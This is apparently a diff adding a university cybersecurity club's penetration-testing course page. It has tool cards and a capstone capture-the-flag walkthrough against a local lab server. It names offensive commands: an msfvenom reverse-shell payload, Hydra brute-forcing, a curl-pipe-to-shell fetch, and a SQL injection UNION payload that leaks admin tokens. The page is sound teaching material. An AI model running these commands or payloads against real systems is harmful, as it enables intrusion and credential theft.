+                <p class="desc">Capture + dissect. Display filter syntax: <code>tshark -Y 'http'</code>.</p>
+                <div class="ex">tshark -r cap.pcap -Y http</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">SMB enum</div>
+                <div class="name">smbclient / enum4linux</div>
+                <p class="desc">Anonymous share listing, RPC enumeration, user dump.</p>
+                <div class="ex">smbclient -L //10.0.0.10 -N<br>enum4linux -a 10.0.0.10</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Banner grab</div>
+                <div class="name">netcat (nc)</div>
+                <p class="desc">Raw TCP — banners, manual HTTP, reverse-shell catcher.</p>
+                <div class="ex">nc -nv 10.0.0.10 21</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Vuln research</div>
+                <div class="name">searchsploit</div>
+                <p class="desc">Local Exploit-DB CLI. Ships with Kali.</p>
+                <div class="ex">searchsploit vsftpd 2.3.4</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Exploitation</div>
+                <div class="name">Metasploit (msfconsole)</div>
+                <p class="desc">Largest curated exploit/payload framework. Opt-in install in this image.</p>
+                <div class="ex">use exploit/multi/handler<br>set PAYLOAD ...; exploit -j</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Payload generator</div>
+                <div class="name">msfvenom</div>
+                <p class="desc">Standalone payloads (ELF/EXE/PHP/raw) for the framework above.</p>
+                <div class="ex">msfvenom -p php/reverse_php LHOST=... LPORT=...</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Password attack</div>
+                <div class="name">John the Ripper</div>
+                <p class="desc">Offline hash cracker. Pair with <code>rockyou.txt</code>.</p>
+                <div class="ex">john --wordlist=rockyou.txt hashes.txt</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Password attack</div>
+                <div class="name">Hashcat</div>
+                <p class="desc">GPU-accelerated cracker. Faster than john on big lists.</p>
+                <div class="ex">hashcat -m 0 hashes.txt rockyou.txt</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Online brute-force</div>
+                <div class="name">Hydra</div>
+                <p class="desc">Multi-protocol online password attacker. SSH, FTP, RDP, HTTP-form, SMB.</p>
+                <div class="ex">hydra -L users -P pass ssh://target</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Privesc helper</div>
+                <div class="name">linpeas / linenum</div>
+                <p class="desc">Linux privilege-escalation enumerators. Runs every checklist for you.</p>
+                <div class="ex">curl ... | sh   # always read first!</div>
+              </div>
+              <div class="tool-card">
+                <div class="role">Wordlists</div>
+                <div class="name">SecLists</div>
+                <p class="desc">The reference wordlist collection (passwords, fuzzing, payloads, default creds).</p>
+                <div class="ex">/usr/share/seclists/</div>
+              </div>
+            </div>
+          </section>
+
+          <!-- ============================ CAPSTONE ============================ -->
+          <article class="module" id="finish" style="border:1px solid #ff5f56;">
+            <div class="module-label">CAPSTONE · OPERATION NIGHTHAWK</div>
+            <h2 style="margin-bottom:10px;">🎯 Operation NightHawk — your final engagement</h2>
+
+            <div class="warn">
+              <strong>Scenario.</strong> NightHawk Industries has hired you for
+              a black-box pen-test. They've dropped you on a VPN segment that can
+              reach exactly one host: <code>http://127.0.0.1:8080</code>.
+              You have <strong>no credentials</strong>, <strong>no source code</strong>
+              and <strong>no documentation</strong>. Their CISO wants one thing
+              back: <strong>proof you can read the admin flag at
+              <code>/admin/flag</code></strong>. Anything else — their host OS,
+              the public internet, the rest of the lab — is
+              <strong>out of scope</strong>.
+            </div>
+
+            <h3>Your kill chain</h3>
+            <p>
+              You've already learnt every move you need. Walk the engagement
+              the same way the chapters did:
+            </p>
+            <ol>
+              <li><strong>Chapter 4 — nmap.</strong> What ports are listening?
+                <code>nmap -sV -p 1-9000 127.0.0.1</code></li>
+              <li><strong>Chapter 5 — enumerate.</strong> Which paths exist?
+                <code>gobuster dir -u http://127.0.0.1:8080 -w /usr/share/wordlists/dirb/common.txt</code></li>
+              <li><strong>Chapter 6 — read the index.</strong> The home page
+                tells you <code>/admin/flag</code> needs an admin Bearer token.</li>
+              <li><strong>Chapter 9 — SQL injection.</strong> Confirm with a
+                single quote on <code>/news?id=1'</code>, then leak the token
+                from the <code>admin_tokens</code> table:
+                <code>id=0+UNION+SELECT+1,token,3+FROM+admin_tokens--</code></li>
+              <li><strong>Chapter 10 — header tampering.</strong>
+                <code>/admin/flag</code> requires BOTH
+                <code>X-Forwarded-For: 127.0.0.1</code> AND
+                <code>Authorization: Bearer &lt;token&gt;</code>.</li>
+              <li><strong>Submit the flag</strong> on the form below to close
+                out the engagement and earn the <strong>+75 XP bonus</strong>.</li>
+            </ol>
+
+            <div class="tip">
+              The full briefing is also seeded inside the desktop at
+              <code>~/lab/CAPSTONE.md</code>. Open the
+              <strong>Pen-test Terminal</strong> launcher and run
+              <code>cat ~/lab/CAPSTONE.md</code>.
+            </div>
+
+            <!--
+              Desktop Lab launcher. Gated by chapter 12 completion in
+              pentest-desktop.js — if any pentest chapter is incomplete,
+              the button shows a lock overlay and a hint instead of
+              spawning a container.
+            -->
+            <h3 style="margin-top:24px;">🖥️ Step 1 — Launch the engagement desktop</h3>
+            <div class="desktop-launch" id="desktopLaunchPanel">
+              <div class="icon">🖥️</div>
+              <div class="body">
+                <p style="margin:0 0 6px; font-size:13px; color:#cfd6e0;">
+                  Real Ubuntu 24.04 desktop in your browser —
+                  <strong>Burp Suite Community</strong>, <strong>Wireshark</strong>,
+                  <strong>nmap</strong>, <strong>gobuster</strong>,
+                  <strong>sqlmap</strong>, <strong>john</strong> and
+                  <strong>hydra</strong> pre-installed. The NightHawk vuln target
+                  ships at <code>~/lab/httpserver.py</code> — start it with
+                  <code>python3 ~/lab/httpserver.py &amp;</code>.
+                </p>
+                <div id="desktopLaunchStatus" data-state="idle">Finish all 12 chapters above to unlock the desktop.</div>
+              </div>
+              <div class="actions">
+                <button type="button" id="desktopLaunchBtn" class="btn-launch">
+                  <span style="font-size:18px;">▶</span> Launch Desktop
+                </button>
+                <button type="button" id="desktopStopBtn" class="btn-stop">
+                  <span style="font-size:14px;">■</span> Stop
+                </button>
+              </div>
+            </div>
+
+            <!--
+              Flag submission form. POSTs to /api/progress/pentest/flag
+              which compares constant-time against the canonical flag and
+              awards +75 XP on first correct submission.
+            -->
+            <h3 style="margin-top:24px;">🚩 Step 2 — Submit the flag</h3>
+            <form id="capstoneFlagForm"
+                  style="display:flex; gap:10px; flex-wrap:wrap; align-items:center;
+                         background:rgba(255,95,86,0.06); border:1px solid rgba(255,95,86,0.30);
+                         border-radius:14px; padding:14px 16px;">
+              <label for="capstoneFlagInput"
+                     style="font-family:'Menlo',monospace; font-size:12px; color:#ff8a8a;">FLAG:</label>
+              <input type="text"
+                     id="capstoneFlagInput"
+                     placeholder="UTB{...}"
+                     autocomplete="off"
+                     spellcheck="false"
+                     style="flex:1; min-width:260px;
+                            background:#050507; border:1px solid #2a2f3a;
+                            border-radius:8px; padding:10px 12px;
+                            color:#9ef7a7; font-family:'Menlo',monospace; font-size:14px;">
+              <button type="submit" id="capstoneFlagBtn"
+                      style="display:inline-flex; align-items:center; gap:8px;
+                             background:linear-gradient(135deg,#ff5f56,#ff8a2e);
+                             color:#0a0a0d; font-weight:700; font-size:14px;
+                             border:none; border-radius:10px; padding:10px 18px; cursor:pointer;">
+                Submit (+75 XP)
+              </button>
+            </form>
+            <div id="capstoneFlagStatus"
+                 style="font-family:'Menlo',monospace; font-size:13px; margin-top:10px;
+                        color:var(--muted); min-height:20px;"></div>
+
+            <p style="margin-top:24px; color:#888; font-size:13px;">
+              The flag never leaves your sandbox — the validator on the website
+              uses a constant-time string compare against the canonical flag.
+              Submit attempts are silent on the server.
+            </p>
+          </article>
+
+        </main>
+      </div>
+    </div>
+  </section>
+
+  <footer class="clean-footer">
+    <div class="container">
+      <div class="footer-grid">
+        <div class="footer-col footer-brand">
+          <div class="footer-logos">
+            <a href="https://www.utb.edu.bh/" target="_blank" rel="noopener" aria-label="University of Technology Bahrain">
+              <img src="assets/images/utblogo.png" alt="University of Technology Bahrain" class="footer-logo">
+            </a>
+            <a href="index.html" aria-label="Cybersecurity Club UTB">
+              <img src="assets/images/logo.png?v=2" alt="Cybersecurity Club UTB" class="footer-logo">
+            </a>
+          </div>
+        </div>
+        <div class="footer-col">
+          <h4>Explore</h4>
+          <ul class="footer-links">
+            <li><a href="about.html">About Us</a></li>
+            <li><a href="news.html">News</a></li>
+            <li><a href="events.html">Events</a></li>
+            <li><a href="learning.html">Learning</a></li>
+            <li><a href="join.html">Apply to Join</a></li>
+          </ul>
+        </div>
+        <div class="footer-col">
+          <h4>University</h4>
+          <ul class="footer-links">
+            <li><a href="https://www.utb.edu.bh/" target="_blank" rel="noopener">UTB Website</a></li>
+          </ul>
+        </div>
+        <div class="footer-col">
+          <h4>Follow Us</h4>
+          <ul class="footer-links">
+            <li><a href="https://www.instagram.com/utb_bahrain/" target="_blank" rel="noopener">Instagram — UTB</a></li>
+            <li><a href="https://www.instagram.com/sc_utb/" target="_blank" rel="noopener">Instagram — Student Council</a></li>
+            <li><a href="https://www.instagram.com/cyber_security_club_utb/" target="_blank" rel="noopener">Instagram — Cybersecurity Club</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <small>College of Computer Studies &middot; &copy; 2026 Cybersecurity Club &mdash; University of Technology Bahrain</small>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Fullscreen iframe modal that hosts the noVNC desktop. Hidden by
+       default; pentest-desktop.js shows it after /launch returns. -->
+  <div id="desktopModal" role="dialog" aria-label="Penetration Testing Desktop">
+    <div class="head">
+      <span class="label">🖥️ Pentest Desktop · Ubuntu 24.04 + XFCE</span>
+      <span class="spacer"></span>
+      <button type="button" id="desktopModalClose">Close window (Esc)</button>
+    </div>
+    <iframe id="desktopFrame" src="about:blank"
+            allow="clipboard-read; clipboard-write"
+            referrerpolicy="no-referrer"
+            sandbox="allow-scripts allow-same-origin allow-forms allow-pointer-lock allow-popups"></iframe>
+  </div>
+
+  <script src="assets/js/app.js?v=notif4"></script>
+  <script src="assets/js/pentest-lab.js?v=1"></script>
+  <script src="assets/js/pentest-desktop.js?v=1"></script>
+</body>
+
+</html>
